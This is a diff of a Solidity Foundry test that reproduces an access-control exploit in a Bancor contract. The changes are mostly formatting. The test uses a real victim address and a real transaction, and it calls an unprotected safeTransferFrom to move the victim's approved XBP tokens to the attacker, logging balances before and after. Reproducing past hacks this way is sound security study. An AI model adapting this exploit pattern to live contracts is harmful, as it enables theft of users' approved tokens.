@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 /*
 Bancor Protocol Access Control Exploit PoC
 
@@ -16,13 +16,15 @@ The attacker can check if an user had granted an allowance to Bancor Contracts t
 Example tx - https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f*/
 
 interface IBancor {
-
-    function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
-
+    function safeTransferFrom(
+        IERC20 _token,
+        address _from,
+        address _to,
+        uint256 _value
+    ) external;
 }
 
 contract BancorExploit is Test {
-
     address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
     address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
     address attacker = address(this);
@@ -36,10 +38,17 @@ contract BancorExploit is Test {
 
     function testsafeTransfer() public {
         emit log_named_uint(
-            "Victim XBPToken Allowance to Bancor Contract : ", (XBPToken.allowance(victim, bancorAddress) / 1 ether)
+            "Victim XBPToken Allowance to Bancor Contract : ",
+            (XBPToken.allowance(victim, bancorAddress) / 1 ether)
         );
-        emit log_named_uint("[Before Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
-        emit log_named_uint("[Before Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);
+        emit log_named_uint(
+            "[Before Attack]Victim XBPToken Balance : ",
+            (XBPToken.balanceOf(victim)) / 1 ether
+        );
+        emit log_named_uint(
+            "[Before Attack]Attacker XBPToken Balance : ",
+            (XBPToken.balanceOf(attacker)) / 1 ether
+        );
 
         vm.prank(address(this));
         bancorContract.safeTransferFrom(
@@ -48,9 +57,16 @@ contract BancorExploit is Test {
             attacker,
             XBPToken.balanceOf(victim) //905987977635678910008152
         );
-        emit log_string("--------------------------------------------------------------");
-        emit log_named_uint("[After Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
-        emit log_named_uint("[After Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);
+        emit log_string(
+            "--------------------------------------------------------------"
+        );
+        emit log_named_uint(
+            "[After Attack]Victim XBPToken Balance : ",
+            (XBPToken.balanceOf(victim)) / 1 ether
+        );
+        emit log_named_uint(
+            "[After Attack]Attacker XBPToken Balance : ",
+            (XBPToken.balanceOf(attacker)) / 1 ether
+        );
     }
-
 }
